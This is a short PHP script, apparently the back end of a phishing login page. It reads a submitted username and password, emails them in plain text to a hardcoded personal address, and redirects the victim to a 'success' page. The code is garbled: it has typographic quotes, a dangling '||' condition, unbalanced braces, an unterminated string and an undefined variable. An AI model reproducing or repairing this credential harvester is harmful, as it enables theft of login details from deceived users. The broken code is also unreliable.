<?php

$errors = ”;

$myemail = ‘mtgillett06@gmail.com’;//<—–Put Your email address here.

if(empty($_POST[‘username’]) ||

empty($_POST[’password’]) ||

{

$errors .= “\n Error: all fields are required”;

}

$username = $_POST[‘username’];

$password = $_POST[’password’];



$to = $myemail;

$email_subject = “Details form submission: $name”;

$email_body = “You have received a new message. “.

” Here are the details:\n Username: $username \n “.

“Password: $password;

$headers = “From: $myemail\n”;


mail($to,$email_subject,$email_body,$headers);

//redirect to the ‘thank you’ page


header(‘Location: success.html’);

}

?>